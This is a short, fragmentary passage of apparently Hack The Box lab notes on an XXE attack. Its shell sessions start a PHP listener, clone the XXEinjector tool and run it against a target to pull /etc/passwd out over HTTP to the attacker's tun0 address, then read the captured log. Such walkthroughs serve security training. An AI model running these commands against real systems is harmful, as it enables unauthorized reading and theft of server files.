...
```shell-session
Pangulin@htb[/htb]$ vi index.php # here we write the above PHP code
Pangulin@htb[/htb]$ php -S 0.0.0.0:8000
...
```shell-session
Pangulin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
...
```shell-session
Pangulin@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
...
```shell-session
Pangulin@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
